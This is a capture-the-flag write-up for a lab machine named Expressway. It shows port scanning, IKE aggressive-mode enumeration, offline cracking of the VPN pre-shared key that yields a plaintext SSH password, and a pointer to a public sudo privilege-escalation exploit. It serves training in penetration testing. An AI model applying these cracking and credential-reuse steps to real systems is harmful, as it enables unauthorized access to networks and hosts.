![[Pasted_image_20250924112359.png]]


## Port Scan 

```bash
 sudo nmap -Pn -sCV -p- --min-rate 2500 -T3 -oN expressway-port-scan.txt 10.10.11.87             
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 11:22 EAT
Nmap scan report for 10.10.11.87
Host is up (0.34s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.92 seconds
```

Only one port open.

performing a udp sport scan i get  this 

```bash
sudo nmap -sU 10.10.11.87    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 11:59 EAT
Stats: 0:06:15 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 36.98% done; ETC: 12:16 (0:10:39 remaining)
Nmap scan report for 10.10.11.87
Host is up (0.26s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1090.00 seconds
```

Port 500 is of interest.

Port **500/udp** is the IKE (Internet Key Exchange) port used by IPsec VPNs to negotiate security associations (keys, algorithms, identities) and—together with UDP/4500 for NAT-T—establish encrypted tunnels; its attack surface includes information leakage from IKE exchanges (vendor/identity strings and, in aggressive mode, AUTH/PSK hashes that can be cracked offline), brute-force or dictionary attacks against pre-shared keys, exploitation of implementation bugs in IPsec/IKE daemons (vendor-specific CVEs), replay or DoS/amplification via crafted/fragmented UDP packets, misconfigurations like weak PSKs, exposed private keys or bad certificate handling, insecure split-tunneling or route/policy mistakes that expose internal services, and the risk that a compromised VPN credential or vulnerable client grants an attacker lateral access to the internal network.

Interacting with the port 

```bash
ike-scan -A -M 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=2295094c2c127cf8)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.274 seconds (3.65 hosts/sec).  1 returned handshake; 0 returned notify
```

From the scan we identify a user. Below we get the IKE PSK parameters

```bash
ike-scan -A -M 10.10.11.87 -P     
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=6afd754c5bff57dd)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
248e141e0a3c0ea7aa380bae49ece29a0b5a790d2b44986a9e045f1bf1780e41455d109dbd9d17e8e865f86e5e8f27d038637311dfd7f5b99435cc172ec3be68cd392b7f16525d21930cb96edd343af0621e786785ea8b6eced3dd239c03e6a3626b69b0b8c94cbd99d3afd8adc3b96f70e132f8b30c4d8b70493ee2fb0943af:e51caad988448c89a341af2212a310c53686f7ba596604890f193995cddd03115080108a4a0a6e96ebd909e321040ac7fca8bf5b6c728237d38b617540f4cdfc026de0cdc7281202e6432d4e80110ce1849de8abeb1adb592b0ce1025026d6631a2a24d8fe929d5646129cfa9f0fb422edb653ae83020469d76b3f1f4fdc622a:6afd754c5bff57dd:98fb1916e2927572:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:5dbf7fb40ac4f3f1303df0c81e300b9e04126792:c4a90babacd61163f3b91589659720928c1d2033459181b5395dcd856d7f2b0b:aa71d700c3d1a899f6bdcc7cf9d810c1c97ab916
Ending ike-scan 1.9.6: 1 hosts scanned in 0.517 seconds (1.93 hosts/sec).  1 returned handshake; 0 returned notify

```


From the tool help menu there is this option 

```bash
--pskcrack[=<f>] or -P[<f>] Crack aggressive mode pre-shared keys.
			This option outputs the aggressive mode pre-shared key
			(PSK) parameters for offline cracking using the
			"psk-crack" program that is supplied with ike-scan.
			You can optionally specify a filename, <f>, to write
			the PSK parameters to.  If you do not specify a filename
			then the PSK parameters are written to standard output.
			If you are using the short form of the option (-P)
			then the value must immediately follow the option
			letter with no spaces, e.g. -Pfile not -P file.
			You can only specify a single target host if you use
			this option.
			This option is only applicable to IKE aggressive mode.
```


```bash
ike-scan -M -A 10.10.11.87  --pskcrack=psk_hash.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=39384e74dc76d6df)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.584 seconds (1.71 hosts/sec).  1 returned handshake; 0 returned notify
```

```bash
cat psk_hash.txt
5f49fa90fc02eb7c2a11aa8e9d11e87661c185d687e17481b5db242f14c686c066c1ea23da2eff5486d0aafaee2903d6e6056b30668a2d4e081a32b3c5587481cd40d931401a41a138e6abe288b25d1838bccd9973a0f02660148c28a1af63d0be22d82b2ad6e0f7e5fc43e8400dbd766d095c60b01ad19e72f43bd15a73e3e2:c5a75b3a885d56457341b4d4b7202ade3db5ffb2eef2eca9827f5a8268ffad662f5148ff3e514f7e8fe60556331d23c09f60e26f23cec7183f82d7a496d5faa53adabdedb0cf1e5f34d51e223487e97ec3023163ef018a357ef938c626b5b3fdf3ac8365b3c8de7efd3e8c73bc6c377028b0585a11626d4e231024ffab97cc1d:39384e74dc76d6df:7064a9802d086e3d:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:634697af8fa54a23c5142368ea9f3b64e0af84d5:83b0bd0182e69360104eaf1216527b738c19be6f0c6491f03255e18349397f17:f47d2e878366f27bdac3e6ec8d408ff975c48524
```

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt psk_hash.txt 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash f47d2e878366f27bdac3e6ec8d408ff975c48524
Ending psk-crack: 8045040 iterations in 17.441 seconds (461275.63 iterations/sec)
```

using the following credentials at ssh we get authenticated `ike:freakingrockstarontheroad`

we get user flag

## PE

chekcing the version of sudo we get 

```bash
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
ike@expressway:~$ 
```

Checking if there are any known public exploits for that version i get this 

```
Sudo version 1.9.17 is affected by two critical vulnerabilities, CVE-2025-32462 and CVE-2025-32463, which were patched in the subsequent release, sudo 1.9.17p1. CVE-2025-32462 is a high-severity "Policy-Check Flaw" that allows local privilege escalation to root by misusing the -h (host) option, bypassing host-based access controls in the sudoers file; this flaw has been present since 2013 and affects sudo versions 1.8.8 through 1.9.17. CVE-2025-32463, rated critical with a CVSS score of 9.3, is a "chroot to root" bug that enables attackers to run arbitrary commands as root by exploiting the -R (--chroot) option with a malicious library, affecting versions 1.9.14 through 1.9.17. Both vulnerabilities were discovered by the Stratascale Cyber Research Unit and require immediate patching to systems running vulnerable versions, with the recommended mitigation being an upgrade to sudo 1.9.17p1 or later.
```

PoC at https://www.exploit-db.com/exploits/52352

